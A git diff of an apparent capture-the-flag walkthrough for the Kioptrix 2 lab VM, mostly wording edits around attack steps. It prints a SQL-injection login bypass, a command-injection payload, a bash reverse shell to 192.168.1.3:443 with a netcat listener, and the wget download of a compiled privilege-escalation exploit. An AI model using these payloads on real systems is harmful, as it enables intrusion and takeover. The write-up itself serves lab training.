@@ -10,7 +10,7 @@ comments: true
 
 Welcome back to the Kioptrix VM Series!
 
-These write-ups were created in aiding those starting the PWK Course, or who are training for the OSCP Course. The Kioptrix VM's were created to closely resemble those in the PWK Course. To read more about this, or if you haven't already read my first post for Kioptrix 1 - then I suggest you do so. That post can be found [here](https://jhalon.github.io/vulnhub-kioptrix1/).
+These write-ups were created in aiding those starting the PWK Course, or who are training for the OSCP Certificate. The Kioptrix VM's were created to closely resemble those in the PWK Course. To read more about this, or if you haven't already read my first post for Kioptrix 1 - then I suggest you do so. That post can be found [here](https://jhalon.github.io/vulnhub-kioptrix1/).
 
 Okay then - let's get to pwning Kioptrix 2!
 
@@ -106,21 +106,21 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 20.15 seconds
 ```
 
-From the initial nmap scans we can see that we have TCP/22 (SSH), TCP/80, and TCP/443 (HTTP/HTTPS) running on the server that can be of interest to us. We can also see that TCP/3306 (MySQL) is running - which leads me to believe that this website is connected to a back end database. This might mean that a [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) somewhere on the page is viable. 
+From the initial nmap scans we can see that we have TCP/22 (SSH), TCP/80, and TCP/443 (HTTP/HTTPS) running on the server which can be of interest to us. We can also see that TCP/3306 (MySQL) is running - which leads me to believe that this website is connected to a back end database. This might mean that a [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) is viable somewhere on the page. 
 
 Another thing that really stood out to me was TCP/631 which is the IPP (Internet Printing Protocol), running CUPS (Common Unix Printing System) v 1.1. A quick Google search showed us that CUPS had multiple vulnerabilities. Including a RCE or Remote Code Execution that was found [here](https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0301-exploits/sigcups.c).
 
-Though attempts to exploit that vulnerability were futile, thus I decided to go find another attack vector.
+Though attempts to exploit that vulnerability were futile, I decided to go find another attack vector.
 
-So our initial step here would be to navigate to the IP of the Kioptrix VM to see what website is being hosted.
+Our initial step from here would be to see what website is being hosted on the VM.
 
 <a href="/images/kiop2-1.png"><img src="/images/kiop2-1.png"></a>
 
-From the page, we can see that there is a Login on the page. And since there is a MySQL Server running on the backend, then we can try a SQL Injection.
+We can see that there is a Login on the page. And since there is a MySQL Server running on the backend, we can go ahead and try a SQL Injection.
 
 If you want to learn more about SQL Injection Exploits on Login Pages, then I suggest you read this article by [Security Idiots](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html).
 
-My initial thought for this login page is that the backend SQL Query looks similar to something like this:
+At this point, I assumed that the login pages backend SQL Query looked similar to something like this:
 
 ```sql
 SELECT * FROM users WHERE username='' AND password=''
@@ -132,7 +132,7 @@ Let's go ahead and try injecting the following code in both the Username and Pas
 1' or '1'='1
 ```
 
-And if we are correct, the backend SQL Query should look like the following.
+And if we are correct, the backend SQL Query should look like the following:
 
 ```sql
 SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'
@@ -144,11 +144,11 @@ This basically means that if Username = True and Password = True, then log us in
 
 Perfect! The SQL Injection worked and we are able to access the next page, which seems like a Ping Command prompt!
 
-So let's go ahead and test this by trying to ping our localhost or 127.0.0.1.
+We can test this Ping Command prompt by trying to ping our localhost (127.0.0.1).
 
 <a href="/images/kiop2-3.png"><img src="/images/kiop2-3.png"></a>
 
-Okay! It seems that the ping command works and the backend php code is executing system commands. At this point, we can try to see if the php script is vulnerable to [Command Injection](https://www.owasp.org/index.php/Command_Injection).
+Okay! It seems that the ping command works and that the php code is executing system commands. At this point, we can try to see if the php script is vulnerable to [Command Injection](https://www.owasp.org/index.php/Command_Injection).
 
 Back at the main Ping Command page, let's go ahead and type in: 
 
@@ -156,13 +156,13 @@ Back at the main Ping Command page, let's go ahead and type in:
 127.0.0.1; id
 ```
 
-What this does, is basically tells the system to run __ping__ against our localhost machine (127.0.0.1), then run the __id__ command. Technically the "__;__" is a command separator.
+What this does, is basically tells the system to run __ping__ against our localhost machine (127.0.0.1), then run the __id__ command. Technically the "__;__" symbol is a command separator.
 
 <a href="/images/kiop2-4.png"><img src="/images/kiop2-4.png"></a>
 
-Nice! The script is vulnerable to command injection! Thus, we can go ahead and attempt a [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
+Nice! The script is vulnerable to command injection! Thus, we can go ahead and attempt to invoke a [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-Let's start by setting up a Netcat listener on port 443 - since this is already open on the victim’s machine.
+Let's start by setting up a Netcat listener on port 443 - since the port is already open on the victim’s machine.
 
 ```console
 root@kali:~# nc -nlvp 443
@@ -175,11 +175,11 @@ Now, let's go back to the Ping console on the website and run the following comm
 127.0.0.1; bash -i >& /dev/tcp/192.168.1.3/443 0>&1
 ```
 
-This will basically initiate a reverse TCP connection using bash.
+This will basically initiate a reverse TCP connection using bash to the IP address of your machine (192.168.1.3 in my case), on port 443.
 
 <a href="/images/kiop2-5.png"><img src="/images/kiop2-5.png"></a>
 
-Perfect! We were able to connect to the victim’s machine, and it seems we are currently running as the account __apache__. Our next step would be to carry out some [Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to be able to get access to the root account.
+Perfect! We were able to connect to the victim’s machine, and it seems that we are currently running as the __apache__ account. Our next step from here would be to carry out some [Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to be able to get access to the root account.
 
 Let's start by seeing what version of Linux the system is running.
 
@@ -202,7 +202,7 @@ root@kali:~# gedit priv.c
 root@kali:~# gcc -o priv priv.c
 ```
 
-At this point what I will do, is move over the exploit to __/var/www/html__ and start up my apache server. This way I can use [wget](https://www.gnu.org/software/wget/) from the victims machine to download the compiled exploit from my computer.
+At this point what I will do, is copy over the exploit to __/var/www/html__ and start up my apache server. This way I can use [wget](https://www.gnu.org/software/wget/) from the victims machine to download the compiled exploit from my computer.
 
 ```console
 root@kali:~# mv priv /var/www/htlm
